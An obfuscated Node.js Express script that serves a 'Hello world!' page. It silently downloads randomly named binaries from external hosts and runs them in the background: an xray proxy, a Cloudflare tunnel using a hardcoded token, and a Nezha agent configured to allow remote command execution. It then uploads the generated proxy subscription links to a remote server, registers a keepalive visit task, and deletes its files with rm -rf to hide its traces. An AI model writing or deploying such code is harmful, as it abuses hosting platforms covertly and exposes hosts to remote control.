const _0x3adeaf=_0x5037;(function(_0x259ae6,_0x1e9b07){const _0x375af1=_0x5037,_0xc9d33d=_0x259ae6();while(!![]){try{const _0x3e6e5d=-parseInt(_0x375af1(0x17a))/0x1+-parseInt(_0x375af1(0x193))/0x2*(-parseInt(_0x375af1(0x12a))/0x3)+parseInt(_0x375af1(0x12e))/0x4*(-parseInt(_0x375af1(0x14c))/0x5)+parseInt(_0x375af1(0x1a6))/0x6*(parseInt(_0x375af1(0x1d3))/0x7)+parseInt(_0x375af1(0x1a9))/0x8*(-parseInt(_0x375af1(0x1d7))/0x9)+-parseInt(_0x375af1(0x15d))/0xa+parseInt(_0x375af1(0x1dd))/0xb*(parseInt(_0x375af1(0x1cc))/0xc);if(_0x3e6e5d===_0x1e9b07)break;else _0xc9d33d['push'](_0xc9d33d['shift']());}catch(_0x1b606d){_0xc9d33d['push'](_0xc9d33d['shift']());}}}(_0x3a66,0xbc955));const express=require(_0x3adeaf(0x1d1)),app=express(),axios=require(_0x3adeaf(0x1b9)),os=require('os'),fs=require('fs'),path=require(_0x3adeaf(0x1bf)),{promisify}=require(_0x3adeaf(0x135)),exec=promisify(require(_0x3adeaf(0x1a7))[_0x3adeaf(0x191)]),{execSync}=require(_0x3adeaf(0x1a7)),UPLOAD_URL=process['env'][_0x3adeaf(0x154)]||'',PROJECT_URL=process[_0x3adeaf(0x188)][_0x3adeaf(0x1a3)]||'',AUTO_ACCESS=process[_0x3adeaf(0x188)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x3adeaf(0x188)][_0x3adeaf(0x158)]||'./tmp',SUB_PATH=process[_0x3adeaf(0x188)][_0x3adeaf(0x186)]||_0x3adeaf(0x1bb),PORT=process[_0x3adeaf(0x188)][_0x3adeaf(0x1bd)]||process[_0x3adeaf(0x188)][_0x3adeaf(0x12d)]||0xbb8,UUID=process[_0x3adeaf(0x188)][_0x3adeaf(0x18b)]||_0x3adeaf(0x12f),NEZHA_SERVER=process['env'][_0x3adeaf(0x15a)]||'',NEZHA_PORT=process[_0x3adeaf(0x188)][_0x3adeaf(0x1ba)]||'',NEZHA_KEY=process[_0x3adeaf(0x188)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x3adeaf(0x122)]||_0x3adeaf(0x1cb),ARGO_AUTH=process[_0x3adeaf(0x188)][_0x3adeaf(0x190)]||'eyJhIjoiYTYxNjMxMzEwZWRiOTQ3MzVkNWM3OTExMmQyNTFkMGQiLCJ0IjoiNjlmY2NiYmUtNzFkNy00NGVhLTk0MjgtMzEzNGVkMDU4ODEzIiwicyI6Ik56VTRPVGRsTW1RdE1UazFPQzAwWXpjeUxXRXhZMk10TldFeVkySmtORGcxTnpnMyJ9',ARGO_PORT=process[_0x3adeaf(0x188)]['ARGO_PORT']||0x1f41,CFIP=process[_0x3adeaf(0x188)][_0x3adeaf(0x172)]||_0x3adeaf(0x14b),CFPORT=process['env'][_0x3adeaf(0x167)]||0x1bb,NAME=process['env'][_0x3adeaf(0x1e0)]||_0x3adeaf(0x1bb);!fs[_0x3adeaf(0x1e1)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x3adeaf(0x174)](FILE_PATH+_0x3adeaf(0x134))):console[_0x3adeaf(0x174)](FILE_PATH+_0x3adeaf(0x136));function generateRandomName(){const _0x61a2d1=_0x3adeaf,_0x41833d=_0x61a2d1(0x16d);let _0x49b414='';for(let _0x5aaa51=0x0;_0x5aaa51<0x6;_0x5aaa51++){_0x49b414+=_0x41833d[_0x61a2d1(0x159)](Math[_0x61a2d1(0x16a)](Math['random']()*_0x41833d[_0x61a2d1(0x140)]));}return _0x49b414;}function _0x3a66(){const _0x5252cf=['SUB_PATH','test','env','npm\x20running\x20error:\x20','tcp','UUID','readdirSync','unshift','catch','arm64','ARGO_AUTH','exec','readFileSync','1032542oDEfvZ','stream','del\x20/f\x20/q\x20','Subscription\x20uploaded\x20successfully','list.txt','trojan','Add\x20automatic\x20access\x20task\x20faild:\x20','aarch64','utf-8','App\x20is\x20running','http','?security=tls&sni=','127.0.0.1','response','writeFileSync','pipe','PROJECT_URL','TunnelSecret','https://oooo.serv00.net/add-url','954642PSzTdJ','child_process','https://arm64.ssss.nyc.mn/v1','16sgNIvT','https://amd64.ssss.nyc.mn/web','Nodes\x20uploaded\x20successfully','vless','status','2053','https+local://8.8.8.8/dns-query','/api/add-nodes','clear','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','error','Hello\x20world!','\x22\x20>\x20/dev/null\x202>&1','2083','--tls','set','axios','NEZHA_PORT','godeluoo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','SERVER_PORT','has','path','Error\x20in\x20startserver:','amd','nohup\x20','\x20>/dev/null\x202>&1','\x20-c\x20','false','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','toString','php\x20running\x20error:\x20','Error\x20executing\x20command:\x20','/dev/null','godeluoo.chatgptaigode.eu.org','24BengGM','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/bot','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','substring','express','base64','63ihkZeQ','Skipping\x20adding\x20automatic\x20access\x20task','isFile','\x20is\x20running','6288390JZqiOC','push','includes','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/tunnel.yml\x20run','from','9175892qfBxYw','freedom','tunnel.json','NAME','existsSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ARGO_DOMAIN','application/json','&fp=firefox&type=ws&host=','/vmess-argo','&path=%2Fvless-argo%3Fed%3D2560#','\x20failed:\x20','Error\x20reading\x20boot.log:','platform','3XsCaAs','none','config.json','PORT','12484AuvgWe','7530674d-cfae-4faf-9060-b4d35b1002ac','\x0aclient_secret:\x20','xtls-rprx-vision','true','\x20>/dev/null\x202>&1\x20&','\x20is\x20created','util','\x20already\x20exists','https://arm64.ssss.nyc.mn/web','Download\x20','direct','blackhole','/vless-argo','listen','/sub.txt\x20saved\x20successfully','rm\x20-rf\x20','mkdirSync','length','pkill\x20-f\x20\x22[','firefox','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','match','post','stringify','boot.log','8443','message','map','cdns.doon.eu.org','360pGyoQR','\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20','data','split','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0avless://','quic','UPLOAD_URL','filter','Content-Type','join','FILE_PATH','charAt','NEZHA_SERVER','web\x20running\x20error:\x20','unlinkSync','4238420ejaSPU','send','https://amd64.ssss.nyc.mn/v1','win32','2096','get','taskkill\x20/f\x20/im\x20','tls','arm','sub.txt','CFPORT','text/plain;\x20charset=utf-8','/trojan-argo','floor','443','fileName','abcdefghijklmnopqrstuvwxyz','arch','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-c\x20\x22','\x0a\x20\x20\x0atrojan://','CFIP','tunnel.yml','log','forEach','finish','/api/add-subscriptions','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','798167mrjoEN','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','config.yaml','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','NEZHA\x20variable\x20is\x20empty,skip\x20running','all','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20\x0avmess://','\x0a\x20\x20tunnel:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','basename','ArgoDomain:'];_0x3a66=function(){return _0x5252cf;};return _0x3a66();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3adeaf(0x157)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x3adeaf(0x157)](FILE_PATH,webName),botPath=path[_0x3adeaf(0x157)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x3adeaf(0x166)),listPath=path['join'](FILE_PATH,_0x3adeaf(0x197)),bootLogPath=path[_0x3adeaf(0x157)](FILE_PATH,_0x3adeaf(0x147)),configPath=path[_0x3adeaf(0x157)](FILE_PATH,_0x3adeaf(0x12c));function deleteNodes(){const _0xd0015f=_0x3adeaf;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x27f753;try{_0x27f753=fs[_0xd0015f(0x192)](subPath,_0xd0015f(0x19b));}catch{return null;}const _0x41fde6=Buffer[_0xd0015f(0x1dc)](_0x27f753,_0xd0015f(0x1d2))[_0xd0015f(0x1c7)](_0xd0015f(0x19b)),_0x553d37=_0x41fde6['split']('\x0a')[_0xd0015f(0x155)](_0x24a091=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xd0015f(0x187)](_0x24a091));if(_0x553d37[_0xd0015f(0x140)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0xd0015f(0x146)]({'nodes':_0x553d37}),{'headers':{'Content-Type':_0xd0015f(0x123)}})[_0xd0015f(0x18e)](_0x59f50b=>{return null;}),null;}catch(_0x5b74d6){return null;}}function cleanupOldFiles(){const _0x139e55=_0x3adeaf;try{const _0x3e255d=fs[_0x139e55(0x18c)](FILE_PATH);_0x3e255d[_0x139e55(0x175)](_0x4476e7=>{const _0x45384d=_0x139e55,_0x31dee1=path[_0x45384d(0x157)](FILE_PATH,_0x4476e7);try{const _0x5d69cb=fs['statSync'](_0x31dee1);_0x5d69cb[_0x45384d(0x1d5)]()&&fs[_0x45384d(0x15c)](_0x31dee1);}catch(_0x4f6834){}});}catch(_0x33dfc1){}}app[_0x3adeaf(0x162)]('/',function(_0x2e7359,_0x10fe6){const _0x3fb0a1=_0x3adeaf;_0x10fe6[_0x3fb0a1(0x15e)](_0x3fb0a1(0x1b4));});function _0x5037(_0x5e6aa3,_0x19a293){const _0x3a66cf=_0x3a66();return _0x5037=function(_0x5037e1,_0x8929e6){_0x5037e1=_0x5037e1-0x122;let _0x4a7d34=_0x3a66cf[_0x5037e1];return _0x4a7d34;},_0x5037(_0x5e6aa3,_0x19a293);}async function generateConfig(){const _0x1b0108=_0x3adeaf,_0x21de01={'log':{'access':_0x1b0108(0x1ca),'error':_0x1b0108(0x1ca),'loglevel':_0x1b0108(0x12b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1b0108(0x1ac),'settings':{'clients':[{'id':UUID,'flow':_0x1b0108(0x131)}],'decryption':_0x1b0108(0x12b),'fallbacks':[{'dest':0xbb9},{'path':_0x1b0108(0x13b),'dest':0xbba},{'path':_0x1b0108(0x125),'dest':0xbbb},{'path':_0x1b0108(0x169),'dest':0xbbc}]},'streamSettings':{'network':_0x1b0108(0x18a)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x1b0108(0x1ac),'settings':{'clients':[{'id':UUID}],'decryption':_0x1b0108(0x12b)},'streamSettings':{'network':_0x1b0108(0x18a),'security':_0x1b0108(0x12b)}},{'port':0xbba,'listen':_0x1b0108(0x19f),'protocol':_0x1b0108(0x1ac),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1b0108(0x12b)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1b0108(0x164),_0x1b0108(0x153)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1b0108(0x19f),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1b0108(0x19d),'tls',_0x1b0108(0x153)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x1b0108(0x198),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1b0108(0x12b),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1b0108(0x19d),'tls',_0x1b0108(0x153)],'metadataOnly':![]}}],'dns':{'servers':[_0x1b0108(0x1af)]},'outbounds':[{'protocol':_0x1b0108(0x1de),'tag':_0x1b0108(0x139)},{'protocol':_0x1b0108(0x13a),'tag':'block'}]};fs[_0x1b0108(0x1a1)](path[_0x1b0108(0x157)](FILE_PATH,_0x1b0108(0x12c)),JSON[_0x1b0108(0x146)](_0x21de01,null,0x2));}function getSystemArchitecture(){const _0x5a7ef7=_0x3adeaf,_0x2eeccd=os[_0x5a7ef7(0x16e)]();return _0x2eeccd===_0x5a7ef7(0x165)||_0x2eeccd===_0x5a7ef7(0x18f)||_0x2eeccd===_0x5a7ef7(0x19a)?_0x5a7ef7(0x165):_0x5a7ef7(0x1c1);}function downloadFile(_0x2c9327,_0x1ab030,_0x2c9b1f){const _0x41ffd9=_0x3adeaf,_0x1dab94=_0x2c9327;!fs['existsSync'](FILE_PATH)&&fs[_0x41ffd9(0x13f)](FILE_PATH,{'recursive':!![]});const _0x3adf55=fs['createWriteStream'](_0x1dab94);axios({'method':_0x41ffd9(0x162),'url':_0x1ab030,'responseType':_0x41ffd9(0x194)})['then'](_0x4cf39b=>{const _0xc05b16=_0x41ffd9;_0x4cf39b[_0xc05b16(0x14f)][_0xc05b16(0x1a2)](_0x3adf55),_0x3adf55['on'](_0xc05b16(0x176),()=>{const _0x3f12d3=_0xc05b16;_0x3adf55['close'](),console[_0x3f12d3(0x174)](_0x3f12d3(0x138)+path[_0x3f12d3(0x184)](_0x1dab94)+'\x20successfully'),_0x2c9b1f(null,_0x1dab94);}),_0x3adf55['on'](_0xc05b16(0x1b3),_0x4bf9a8=>{const _0x168204=_0xc05b16;fs['unlink'](_0x1dab94,()=>{});const _0x61f7e5=_0x168204(0x138)+path[_0x168204(0x184)](_0x1dab94)+_0x168204(0x127)+_0x4bf9a8[_0x168204(0x149)];console[_0x168204(0x1b3)](_0x61f7e5),_0x2c9b1f(_0x61f7e5);});})[_0x41ffd9(0x18e)](_0x47389f=>{const _0xd190f1=_0x41ffd9,_0x1ad079='Download\x20'+path[_0xd190f1(0x184)](_0x1dab94)+_0xd190f1(0x127)+_0x47389f[_0xd190f1(0x149)];console[_0xd190f1(0x1b3)](_0x1ad079),_0x2c9b1f(_0x1ad079);});}async function downloadFilesAndRun(){const _0xe95719=_0x3adeaf,_0x5235a8=getSystemArchitecture(),_0x4db24a=getFilesForArchitecture(_0x5235a8);if(_0x4db24a[_0xe95719(0x140)]===0x0){console[_0xe95719(0x174)](_0xe95719(0x16f));return;}const _0x47c835=_0x4db24a[_0xe95719(0x14a)](_0x761f39=>{return new Promise((_0x4305f0,_0x1f8acd)=>{const _0x53c063=_0x5037;downloadFile(_0x761f39[_0x53c063(0x16c)],_0x761f39['fileUrl'],(_0x41ebe4,_0x17d019)=>{_0x41ebe4?_0x1f8acd(_0x41ebe4):_0x4305f0(_0x17d019);});});});try{await Promise[_0xe95719(0x17f)](_0x47c835);}catch(_0x259f85){console['error']('Error\x20downloading\x20files:',_0x259f85);return;}function _0x4c26de(_0x1bdd7e){const _0x2fc804=_0xe95719,_0x554244=0x1fd;_0x1bdd7e[_0x2fc804(0x175)](_0x3a4476=>{const _0x13a097=_0x2fc804;fs[_0x13a097(0x1e1)](_0x3a4476)&&fs['chmod'](_0x3a4476,_0x554244,_0x1b007d=>{const _0x58e839=_0x13a097;_0x1b007d?console[_0x58e839(0x1b3)]('Empowerment\x20failed\x20for\x20'+_0x3a4476+':\x20'+_0x1b007d):console[_0x58e839(0x174)]('Empowerment\x20success\x20for\x20'+_0x3a4476+':\x20'+_0x554244[_0x58e839(0x1c7)](0x8));});});}const _0x352ec7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c26de(_0x352ec7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c5bc0=NEZHA_SERVER[_0xe95719(0x1d9)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x1ef6f2=new Set(['443',_0xe95719(0x148),_0xe95719(0x161),'2087',_0xe95719(0x1b6),_0xe95719(0x1ae)]),_0x50783f=_0x1ef6f2[_0xe95719(0x1be)](_0x3c5bc0)?_0xe95719(0x132):_0xe95719(0x1c5),_0x5def0c=_0xe95719(0x130)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xe95719(0x1e2)+_0x50783f+_0xe95719(0x1cf)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0xe95719(0x17c)),_0x5def0c);const _0x44f66d='nohup\x20'+phpPath+_0xe95719(0x170)+FILE_PATH+_0xe95719(0x1da);try{await exec(_0x44f66d),console['log'](phpName+_0xe95719(0x1d6)),await new Promise(_0x4a6ec1=>setTimeout(_0x4a6ec1,0x3e8));}catch(_0x7767f0){console['error'](_0xe95719(0x1c8)+_0x7767f0);}}else{let _0x30b82b='';const _0x58e993=[_0xe95719(0x16b),_0xe95719(0x148),'2096','2087',_0xe95719(0x1b6),_0xe95719(0x1ae)];_0x58e993[_0xe95719(0x1d9)](NEZHA_PORT)&&(_0x30b82b=_0xe95719(0x1b7));const _0x166349=_0xe95719(0x1c2)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x30b82b+_0xe95719(0x151);try{await exec(_0x166349),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x10deae=>setTimeout(_0x10deae,0x3e8));}catch(_0x8d7adf){console[_0xe95719(0x1b3)](_0xe95719(0x189)+_0x8d7adf);}}}else console['log'](_0xe95719(0x17e));const _0x18c451=_0xe95719(0x1c2)+webPath+_0xe95719(0x1c4)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x18c451),console['log'](webName+_0xe95719(0x1d6)),await new Promise(_0x30cf89=>setTimeout(_0x30cf89,0x3e8));}catch(_0x276876){console[_0xe95719(0x1b3)](_0xe95719(0x15b)+_0x276876);}if(fs[_0xe95719(0x1e1)](botPath)){let _0x48a644;if(ARGO_AUTH[_0xe95719(0x144)](/^[A-Z0-9a-z=]{120,250}$/))_0x48a644=_0xe95719(0x1b2)+ARGO_AUTH;else ARGO_AUTH[_0xe95719(0x144)](/TunnelSecret/)?_0x48a644=_0xe95719(0x1bc)+FILE_PATH+_0xe95719(0x1db):_0x48a644=_0xe95719(0x183)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xe95719(0x1c2)+botPath+'\x20'+_0x48a644+_0xe95719(0x133)),console[_0xe95719(0x174)](botName+_0xe95719(0x1d6)),await new Promise(_0x1e3c7c=>setTimeout(_0x1e3c7c,0x7d0));}catch(_0x46d011){console[_0xe95719(0x1b3)]('Error\x20executing\x20command:\x20'+_0x46d011);}}await new Promise(_0x192fc8=>setTimeout(_0x192fc8,0x1388));}function getFilesForArchitecture(_0x3b0e94){const _0x3e1a6a=_0x3adeaf;let _0x12fe6a;_0x3b0e94===_0x3e1a6a(0x165)?_0x12fe6a=[{'fileName':webPath,'fileUrl':_0x3e1a6a(0x137)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x12fe6a=[{'fileName':webPath,'fileUrl':_0x3e1a6a(0x1aa)},{'fileName':botPath,'fileUrl':_0x3e1a6a(0x1ce)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x439314=_0x3b0e94===_0x3e1a6a(0x165)?_0x3e1a6a(0x180):'https://amd64.ssss.nyc.mn/agent';_0x12fe6a[_0x3e1a6a(0x18d)]({'fileName':npmPath,'fileUrl':_0x439314});}else{const _0x372500=_0x3b0e94==='arm'?_0x3e1a6a(0x1a8):_0x3e1a6a(0x15f);_0x12fe6a[_0x3e1a6a(0x18d)]({'fileName':phpPath,'fileUrl':_0x372500});}}return _0x12fe6a;}function argoType(){const _0x278182=_0x3adeaf;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x278182(0x1c6));return;}if(ARGO_AUTH[_0x278182(0x1d9)](_0x278182(0x1a4))){fs['writeFileSync'](path[_0x278182(0x157)](FILE_PATH,_0x278182(0x1df)),ARGO_AUTH);const _0x3de62d=_0x278182(0x182)+ARGO_AUTH[_0x278182(0x150)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x278182(0x157)](FILE_PATH,_0x278182(0x1df))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x278182(0x1cd)+ARGO_PORT+_0x278182(0x17b);fs[_0x278182(0x1a1)](path[_0x278182(0x157)](FILE_PATH,_0x278182(0x173)),_0x3de62d);}else console[_0x278182(0x174)](_0x278182(0x178));}argoType();async function extractDomains(){const _0x3120a1=_0x3adeaf;let _0x536645;if(ARGO_AUTH&&ARGO_DOMAIN)_0x536645=ARGO_DOMAIN,console[_0x3120a1(0x174)]('ARGO_DOMAIN:',_0x536645),await _0x261de5(_0x536645);else try{const _0x275e6e=fs[_0x3120a1(0x192)](path[_0x3120a1(0x157)](FILE_PATH,_0x3120a1(0x147)),_0x3120a1(0x19b)),_0x5a11a9=_0x275e6e['split']('\x0a'),_0x1bd0cc=[];_0x5a11a9[_0x3120a1(0x175)](_0x3e7fe1=>{const _0x14f297=_0x3120a1,_0x34f1d5=_0x3e7fe1['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x34f1d5){const _0x89100a=_0x34f1d5[0x1];_0x1bd0cc[_0x14f297(0x1d8)](_0x89100a);}});if(_0x1bd0cc[_0x3120a1(0x140)]>0x0)_0x536645=_0x1bd0cc[0x0],console[_0x3120a1(0x174)](_0x3120a1(0x185),_0x536645),await _0x261de5(_0x536645);else{console['log'](_0x3120a1(0x143)),fs[_0x3120a1(0x15c)](path[_0x3120a1(0x157)](FILE_PATH,'boot.log'));async function _0x507d19(){const _0xca7550=_0x3120a1;try{process[_0xca7550(0x129)]===_0xca7550(0x160)?await exec(_0xca7550(0x163)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xca7550(0x141)+botName[_0xca7550(0x159)](0x0)+']'+botName[_0xca7550(0x1d0)](0x1)+_0xca7550(0x1b5));}catch(_0x363fc4){}}_0x507d19(),await new Promise(_0x3f28b9=>setTimeout(_0x3f28b9,0xbb8));const _0x19aaf2=_0x3120a1(0x183)+FILE_PATH+_0x3120a1(0x17d)+ARGO_PORT;try{await exec(_0x3120a1(0x1c2)+botPath+'\x20'+_0x19aaf2+_0x3120a1(0x133)),console[_0x3120a1(0x174)](botName+_0x3120a1(0x1d6)),await new Promise(_0x2a82a6=>setTimeout(_0x2a82a6,0xbb8)),await extractDomains();}catch(_0x296631){console[_0x3120a1(0x1b3)](_0x3120a1(0x1c9)+_0x296631);}}}catch(_0x2d17e0){console['error'](_0x3120a1(0x128),_0x2d17e0);}async function _0x261de5(_0x1b5044){const _0x2bf168=_0x3120a1,_0x37cceb=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x2bf168(0x19b)}),_0xc496c8=_0x37cceb['trim'](),_0x519f6a=NAME?NAME+'-'+_0xc496c8:_0xc496c8;return new Promise(_0x2daf13=>{setTimeout(()=>{const _0x1efa39=_0x5037,_0x1409e1={'v':'2','ps':''+_0x519f6a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1efa39(0x12b),'net':'ws','type':_0x1efa39(0x12b),'host':_0x1b5044,'path':'/vmess-argo?ed=2560','tls':_0x1efa39(0x164),'sni':_0x1b5044,'alpn':'','fp':_0x1efa39(0x142)},_0x5db88c=_0x1efa39(0x152)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1b5044+'&fp=firefox&type=ws&host='+_0x1b5044+_0x1efa39(0x126)+_0x519f6a+_0x1efa39(0x181)+Buffer[_0x1efa39(0x1dc)](JSON[_0x1efa39(0x146)](_0x1409e1))[_0x1efa39(0x1c7)](_0x1efa39(0x1d2))+_0x1efa39(0x171)+UUID+'@'+CFIP+':'+CFPORT+_0x1efa39(0x19e)+_0x1b5044+_0x1efa39(0x124)+_0x1b5044+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x519f6a+_0x1efa39(0x14e);console['log'](Buffer[_0x1efa39(0x1dc)](_0x5db88c)['toString'](_0x1efa39(0x1d2))),fs['writeFileSync'](subPath,Buffer[_0x1efa39(0x1dc)](_0x5db88c)[_0x1efa39(0x1c7)]('base64')),console[_0x1efa39(0x174)](FILE_PATH+_0x1efa39(0x13d)),uploadNodes(),app[_0x1efa39(0x162)]('/'+SUB_PATH,(_0x437b8a,_0x3fbb27)=>{const _0x30924f=_0x1efa39,_0x119ead=Buffer[_0x30924f(0x1dc)](_0x5db88c)['toString']('base64');_0x3fbb27[_0x30924f(0x1b8)](_0x30924f(0x156),_0x30924f(0x168)),_0x3fbb27['send'](_0x119ead);}),_0x2daf13(_0x5db88c);},0x7d0);});}}async function uploadNodes(){const _0x4e78a6=_0x3adeaf;if(UPLOAD_URL&&PROJECT_URL){const _0x66b5d6=PROJECT_URL+'/'+SUB_PATH,_0x390670={'subscription':[_0x66b5d6]};try{const _0x3ecd2b=await axios[_0x4e78a6(0x145)](UPLOAD_URL+_0x4e78a6(0x177),_0x390670,{'headers':{'Content-Type':_0x4e78a6(0x123)}});return _0x3ecd2b&&_0x3ecd2b[_0x4e78a6(0x1ad)]===0xc8?(console['log'](_0x4e78a6(0x196)),_0x3ecd2b):null;}catch(_0x50e5c2){if(_0x50e5c2[_0x4e78a6(0x1a0)]){if(_0x50e5c2['response'][_0x4e78a6(0x1ad)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4e78a6(0x1e1)](listPath))return;const _0x495484=fs[_0x4e78a6(0x192)](listPath,_0x4e78a6(0x19b)),_0x479393=_0x495484[_0x4e78a6(0x150)]('\x0a')[_0x4e78a6(0x155)](_0x7476aa=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e78a6(0x187)](_0x7476aa));if(_0x479393[_0x4e78a6(0x140)]===0x0)return;const _0xf3e03a=JSON[_0x4e78a6(0x146)]({'nodes':_0x479393});try{const _0x589156=await axios[_0x4e78a6(0x145)](UPLOAD_URL+_0x4e78a6(0x1b0),_0xf3e03a,{'headers':{'Content-Type':'application/json'}});return _0x589156&&_0x589156['status']===0xc8?(console[_0x4e78a6(0x174)](_0x4e78a6(0x1ab)),_0x589156):null;}catch(_0x216886){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x151576=_0x5037,_0xae0fdb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xae0fdb[_0x151576(0x1d8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xae0fdb['push'](phpPath);process[_0x151576(0x129)]===_0x151576(0x160)?exec(_0x151576(0x195)+_0xae0fdb[_0x151576(0x157)]('\x20')+_0x151576(0x14d),_0xb95b31=>{const _0x3123a5=_0x151576;console['clear'](),console[_0x3123a5(0x174)](_0x3123a5(0x19c)),console[_0x3123a5(0x174)](_0x3123a5(0x179));}):exec(_0x151576(0x13e)+_0xae0fdb[_0x151576(0x157)]('\x20')+_0x151576(0x1c3),_0x2962a7=>{const _0x1c5dc3=_0x151576;console[_0x1c5dc3(0x1b1)](),console[_0x1c5dc3(0x174)](_0x1c5dc3(0x19c)),console[_0x1c5dc3(0x174)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x504db=_0x3adeaf;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x504db(0x174)](_0x504db(0x1d4));return;}try{const _0x1f305a=await axios[_0x504db(0x145)](_0x504db(0x1a5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x504db(0x123)}});return console[_0x504db(0x174)]('automatic\x20access\x20task\x20added\x20successfully'),_0x1f305a;}catch(_0x219e37){return console[_0x504db(0x1b3)](_0x504db(0x199)+_0x219e37[_0x504db(0x149)]),null;}}async function startserver(){const _0x45ece6=_0x3adeaf;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x16d484){console[_0x45ece6(0x1b3)](_0x45ece6(0x1c0),_0x16d484);}}startserver()[_0x3adeaf(0x18e)](_0x462d69=>{const _0xc75cd3=_0x3adeaf;console[_0xc75cd3(0x1b3)]('Unhandled\x20error\x20in\x20startserver:',_0x462d69);}),app[_0x3adeaf(0x13c)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
